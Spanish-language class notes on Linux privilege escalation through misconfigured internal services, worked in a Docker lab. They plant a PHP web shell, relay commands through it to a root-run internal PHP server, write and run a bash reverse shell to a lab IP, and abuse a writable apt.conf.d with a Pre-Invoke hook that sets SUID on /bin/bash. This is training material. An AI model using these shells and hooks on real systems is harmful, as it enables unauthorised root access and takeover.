- Tags: #escalada #escalada_privilegios #escalada_privilegios_linux #escalada_privilegios_linux_abuso_servicios #servicios

Los **servicios internos** son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros.

No obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas.

Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlo, podría utilizarlo para escalar privilegios y obtener acceso de administrador.

En esta clase, analizaremos un caso ilustrativo de cómo un atacante podría, en primer lugar, detectar un servicio activo en el sistema y, posteriormente, explotarlo para incrementar sus privilegios de usuario.


Para ver puertos abiertos dentros de la maquiona
```bash

#Ver puertos abiertos
netstat -nat

#Ver los procesos que se estan ejecuntando
ps -faux
```

Situación 1

Nos montamos un servidor con docker que en el puerto 80 tendremos un servidor con apache2
```bash
docker run -dit --p80:80 --name openRedirect fcd77999de83


apt update
apt install apache2 php net-tools nano

cd /var/www/html
rm index.html
nano index.php
<?php 
	system($_GET['cmd']);
?>
```

Ya con esto podremos hacer peticiones al servidor y poder acceder a informacion dentro de la maquina
```
http://172.17.0.2/?cmd=whoami

#En ocaciones esto puede darnos poroblemas al momentos de ontener la respuesta por lo que se recomients urlencodear el &
http://172.17.0.2/?cmd=netstat -nat 2>&1

http://172.17.0.2/?cmd=netstat -nat 2>%261

```

![](../../../attachments/Pasted%20image%2020260221140302.png)

Esto es para simular que este servidor ya esta comprometido porque la idea es utilizar servicios que no esta expuestos al exterior si no que corren internamente. Esto lo simularemos con *php* creándonos un servidor interno.
```bash
#Nos copimos el index.php que esta en /var/www/html/index.php para /tmp
cp /var/www/html/index.php /tmp
mv index.php cmd.php   #Le cambiamos el nimbre

#Creamo un servidor en php por el port 8000 este se puede acceder desde afuera
php -S 0.0.0.0:8000   
```

![](../../../attachments/Pasted%20image%2020260221141231.png)

Pero lo que queremos es que sea un servicio interno para ver si podemos comprometerlo y leerlo
```bash
#Montamos el servidor php de manera interna para que pueda se accedido solo desde el servidor mismo

php -S 127.0.0.1:8000   
```

![](../../../attachments/Pasted%20image%2020260221141503.png)

Pero ahora vemos desde el servidor de apache2 que están ejecutándose otros servicios de manera interna

![](../../../attachments/Pasted%20image%2020260221141714.png)

Tambien podemos enviar un comando *ps -faux* y vemos el usuario que ejecuta el proceso 

![](../../../attachments/Pasted%20image%2020260221141843.png)

Por lo que podemos atraves del apache2 hacer una petición al servidor interno para obtener el usuario con privilegios

```bash
#Hacemos esta peticion desd el navegador
http://172.17.0.2/?cmd=curl 127.0.0.1:8000/cmd.php?cmd=whoami

#O esta para acceder desde el servidor interno 
http://172.17.0.2/?cmd=curl localhost:8000/cmd.php?cmd=whoami

```

![](../../../attachments/Pasted%20image%2020260221142629.png)

Intentamos hacer ahora una conexión reversa desde los 2 puntos para ver que shell nos otorga

Desde la conexion del apache 

![](../../../attachments/Pasted%20image%2020260221143727.png)

Desde la petición interna del servidor de PHP.

Creamos un fichero shell.sh desde el apache2 para introducir la reverse shell

**Limpiar si existe algo previamente:** `http://172.17.0.2/?cmd=rm+/tmp/shell.sh`

**Escribir el contenido :** `http://172.17.0.2/?cmd=echo+"bash -i >& /dev/tcp/172.17.0.1/4646 0>&1" > /tmp/shell.sh`

**Darle permisos de ejecución:** `http://172.17.0.2/?cmd=chmod+777+/tmp/shell.sh`

**El paso final (La ejecución como root):** http://172.17.0.2/?cmd=curl+"localhost:8000/cmd.php?cmd=/tmp/shell.sh"

Obtenemos la conexión como root
![](../../../attachments/Pasted%20image%2020260221211401.png)


Ahora haremos un ejemplo con servicios en ejecución, nos vamos a `/etc/systemd/system`  y aqui crearemos un servicio de ejemplo que lo que haga es que cada 30 segundos se ejecute el comando *apt update*  

```bash
cd /etc/systemd/system

nano aptupdate.service

[Unit]
Description=Update package list

[Service]
Type=oneshot   #Indica que el servicio se ejecuta una vez y se detiene
ExecStart=/usr/bin/apt update   #Accion que ejecutara

#Aqui se definira cada cuanto se ejecuta la tarea
nano aptupdate.timer

[Unit]
Description=Update package list every 30 seconds

[Timer]
OnUnitActiveSec=30s   #Indicamos cada cuanto tiempo ejecutara 
Unit= aptupdate.service  #Indicamos el servicio que ejecutara

[Install]
WanteBy=timers.target


systemctl daemon-reload
systemctl enable aptupdate.service
systemctl enable aptupdate.timer
systemctl start aptupdate.service
systemctl start aptupdate.timer


#Listar los servicios internos
systemctl list-timers 

#Nos ponemos a wer el tiempo que le queda para ejecutar a un servicio 

watch -n 1 systemctl list-timers

```

Vamos a suponer que otros pueden escribir en la ruta `/etc/apt/apt.conf.d/`  , cuando se aplica una actualization del sistema si tenemos permiso de escritura en esa carpeta se pueden definir ciertas políticas para que el sistema ejecute ciertas tareas o comandos que definamos previo a la actualización del sistema o posterior.

Lo que hariamos es siguiendo la misma estructura de los archivos en el directorio nos creamos uno que nos permita asignarle el bit SUID a la bas
![](../../../attachments/Pasted%20image%2020260221222612.png)

**Recurso**: [https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)

```bash
nano 01privesc

APT::Update::Pre-Invoke { "chmod u+s /bin/bash"; };
 
```

Como hay un servicio que esta corriendo cada 30 segundos haciendo una apt update pues ejecutara nuestro comando *Pre Invocado* y le dará a la *bash* permiso *SUID*